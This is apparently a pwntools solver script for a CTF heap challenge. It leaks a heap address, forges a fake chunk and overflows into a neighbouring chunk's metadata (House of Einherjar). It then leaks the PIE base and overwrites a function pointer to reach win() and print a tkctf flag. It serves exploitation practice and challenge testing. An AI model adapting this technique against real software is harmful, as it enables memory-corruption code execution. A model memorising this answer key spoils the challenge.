#!/usr/bin/env python3

import os
import re
import sys
import subprocess
from pwn import *

context.arch = "x86_64"
context.log_level = 'info'

ROOT = os.path.abspath(os.path.dirname(__file__))
bin_path = os.path.join(ROOT, "../docker/target")

# Detect if binary is 32-bit or 64-bit using readelf for reliability
def detect_arch(binary_path):
    try:
        result = subprocess.run(['readelf', '-h', binary_path],
                              capture_output=True, text=True, check=True)
        if 'ELF32' in result.stdout:
            return 32
        elif 'ELF64' in result.stdout:
            return 64
    except:
        # Fallback to pwntools detection
        elf = ELF(binary_path, checksec=False)
        return elf.bits
    return 64  # Default to 64-bit if detection fails

arch_bits = detect_arch(bin_path)
is_32bit = (arch_bits == 32)
if is_32bit:
    context.arch = "i386"
    log.info("Detected 32-bit binary")
else:
    log.info("Detected 64-bit binary")

def manifest(p, zone):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.recvuntil(b'> ')  # Consume the manifest confirmation and wait for next prompt

def inscribe(p, zone, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    # Send length first (new protocol)
    p.sendlineafter(b'length: ', str(len(data)).encode())
    # Then send raw binary data
    p.sendafter(b'bytes): ', data)
    p.recvuntil(b'> ')  # Consume the inscribe confirmation and wait for next prompt

def view(p, zone):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    return p.recvuntil(b'> ', drop=True)

def corrupt(p, zone):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.recvuntil(b'> ')  # Consume the corrupt confirmation and wait for next prompt

def liberate(p, zone):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.recvuntil(b'> ')  # Consume the liberate confirmation and wait for next prompt

def execute_timeline(p):
    p.sendlineafter(b'> ', b'6')

def exploit(p):
    elf = ELF(bin_path)
    win_addr = elf.symbols['win']
    is_32bit = elf.bits == 32

    # Set pointer packing function based on architecture
    pack_ptr = p32 if is_32bit else p64
    ptr_size = 4 if is_32bit else 8

    # Wait for banner (â• is UTF-8 encoded as \xe2\x95\x90)
    p.recvuntil(b'\xe2\x95\x90')

    log.info("Manifesting all zones")
    for i in range(10):
        manifest(p, i)

    log.info("Leaking heap address")
    output = view(p, 3)
    try:
        heap_leak = int(output.split(b'0x')[1].split(b']')[0], 16)
        log.success(f"Heap leak: {hex(heap_leak)}")
        zone_3_addr = heap_leak
    except:
        log.error("Failed to parse heap leak")
        log.info(output.decode('latin-1', errors='ignore'))
        return None

    log.info("Crafting fake chunk in Zone 3")

    # Calculate chunk sizes based on architecture
    # For 32-bit: malloc(0x100) -> 0x108 chunk, malloc(0x180) -> 0x188 chunk
    # For 64-bit: malloc(0x100) -> 0x110 chunk, malloc(0x180) -> 0x190 chunk
    # Zone struct header is 18 bytes (number + twin + name)
    ZONE_HEADER_SIZE = 18

    if is_32bit:
        zone_3_chunk = 0x188  # Total chunk size including header
        zone_4_chunk = 0x108
        zone_5_chunk = 0x108
        fake_size = 0x109  # Size with PREV_IN_USE flag
    else:
        zone_3_chunk = 0x190
        zone_4_chunk = 0x110
        zone_5_chunk = 0x110
        fake_size = 0x111

    # Calculate addresses
    # zone_3_addr is the user data start, zone struct is at this address
    # Fake chunk will be at offset 0x80 within user data
    fake_chunk_offset = 0x80
    fake_chunk_addr = zone_3_addr + fake_chunk_offset

    # Zone 4 starts at zone_3_addr - ZONE_HEADER_SIZE + zone_3_chunk
    # Actually, zone_3_addr is the malloc return (user data start)
    # Chunk header is 8 bytes before that (prev_size + size)
    # Next chunk starts at: (zone_3_addr - 8) + zone_3_chunk = zone_3_addr + zone_3_chunk - 8
    # But for 32-bit, the chunk includes 8-byte header in the chunk size
    # So next chunk is at: zone_3_addr + (zone_3_chunk - 8)

    # Actually, let's recalculate:
    # zone_3_addr = user data pointer
    # zone_3_chunk = 0x188 (total chunk including 8-byte malloc header)
    # User data size = 0x180
    # Next chunk (Zone 4) starts at zone_3_addr + 0x180
    zone_4_addr = zone_3_addr + 0x180  # User data size for Zone 3
    zone_5_addr = zone_4_addr + 0x100  # User data size for Zone 4
    zone_6_addr = zone_5_addr + 0x100  # User data size for Zone 5

    log.info(f"Zone 4 at: {hex(zone_4_addr)}")
    log.info(f"Zone 6 at: {hex(zone_6_addr)}")

    # For House of Einherjar: fake chunk to Zone 6
    prev_size_value = zone_6_addr - fake_chunk_addr

    log.info(f"Fake chunk at: {hex(fake_chunk_addr)}")
    log.info(f"Prev_size value: {hex(prev_size_value)}")

    # Create fake chunk with valid metadata manually
    # The fake chunk needs: prev_size (can be anything) and size (must be valid)
    fake_chunk = b''
    fake_chunk += pack_ptr(0)  # prev_size at offset 0
    fake_chunk += pack_ptr(fake_size)  # size with PREV_IN_USE flag at offset 4/8
    fake_chunk += b'\x00' * (0x80 - len(fake_chunk))  # Pad to 0x80 bytes

    log.info(f"Fake chunk length: {len(fake_chunk)}")
    log.info(f"Fake chunk (hex): {fake_chunk.hex()[:32]}...")

    inscribe(p, 3, fake_chunk)

    log.info("Enabling corruption on Zone 3")
    corrupt(p, 3)

    log.info("Overflowing into Zone 6 to corrupt metadata")

    # Overflow to set Zone 6's prev_size and clear PREV_IN_USE
    # Zone 3 data starts at zone_3_addr + ZONE_HEADER_SIZE
    # We write to z->data which is at offset ZONE_HEADER_SIZE
    # To reach Zone 6 at zone_3_addr + 0x380:
    # We need to write (0x380 - ZONE_HEADER_SIZE) bytes

    # Zone 6 chunk header is at zone_6_addr - 8 (prev_size and size fields)
    # We need to write to zone_6_addr - 8 to set prev_size
    # From z->data (at zone_3_addr + 18):
    # Distance = (zone_6_addr - 8) - (zone_3_addr + 18) = zone_6_addr - zone_3_addr - 26

    zone_6_chunk_header = zone_6_addr - ptr_size * 2  # prev_size is 2 words before user data
    overflow_distance = zone_6_chunk_header - zone_3_addr - ZONE_HEADER_SIZE

    log.info(f"Overflow distance: {hex(overflow_distance)}")
    log.info(f"Setting prev_size at offset {hex(overflow_distance)}")

    # Build overflow payload
    overflow_payload = flat({
        0: b'B' * 0x80,  # Fill the normal data area
        overflow_distance: pack_ptr(prev_size_value),  # Set Zone 6's prev_size
        overflow_distance + ptr_size: pack_ptr(0x108),  # Set Zone 6's size WITHOUT PREV_IN_USE flag
    }, length=overflow_distance + ptr_size * 2, word_size=ptr_size*8)

    inscribe(p, 3, overflow_payload)

    log.info("Liberating Zone 6")
    liberate(p, 6)

    log.info("Getting PIE base")
    output = view(p, 9)
    try:
        exec_ptr = int(output.split(b'Execute ptr: 0x')[1].split(b']')[0], 16)
        log.success(f"Execute ptr: {hex(exec_ptr)}")

        elf_base = exec_ptr - elf.symbols['safe_exit']
        win_addr_full = elf_base + win_addr
        log.success(f"PIE base: {hex(elf_base)}")
        log.success(f"win() at: {hex(win_addr_full)}")
    except:
        log.warning("Could not leak PIE base, using relative address")
        win_addr_full = win_addr

    log.info("Attempting to overwrite function pointer")

    payload = pack_ptr(win_addr_full)
    inscribe(p, 7, payload)

    log.info("Executing timeline")
    execute_timeline(p)

    return p.recvall(timeout=2)

def parse_flag(out):
    m = re.search(b"(tkctf{[^}]+})", out)
    if m is None:
        return None
    return m.group(0).decode()

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        p = process(bin_path)

    output = exploit(p)
    if output:
        flag = parse_flag(output)
        if flag:
            print(f"Found: {flag}")
            print("OK!")
            exit(0)

    print("FAILED!")
    exit(1)

